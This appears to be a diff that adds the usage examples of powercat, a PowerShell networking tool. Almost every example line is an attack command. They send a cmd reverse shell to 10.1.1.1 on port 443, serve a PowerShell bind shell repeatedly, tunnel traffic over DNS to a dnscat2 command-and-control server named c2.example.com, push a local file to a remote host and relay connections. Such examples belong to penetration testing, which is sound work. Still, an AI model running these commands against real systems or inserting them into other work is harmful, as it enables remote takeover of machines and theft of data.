@@ -1,0 +1,26 @@
+Examples:
+  Listen on port 8000 and print the output to the console.
+      powercat -l -p 8000
+  
+  Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
+      powercat -c 10.1.1.1 -p 443 -e cmd -v
+  
+  Connect to the dnscat2 server on c2.example.com, and send dns queries
+  to the dns server on 10.1.1.1 port 53.
+      powercat -c 10.1.1.1 -p 53 -dns c2.example.com
+  
+  Send a file to 10.1.1.15 port 8000.
+      powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
+  
+  Write the data sent to the local listener on port 4444 to C:\outfile
+      powercat -l -p 4444 -of C:\outfile
+  
+  Listen on port 8000 and repeatedly server a powershell shell.
+      powercat -l -p 8000 -ep -rep
+  
+  Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
+      powercat -l -p 8000 -r tcp:10.1.1.1:9000
+      
+  Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
+  sending queries to 10.1.1.1 port 53.
+      powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
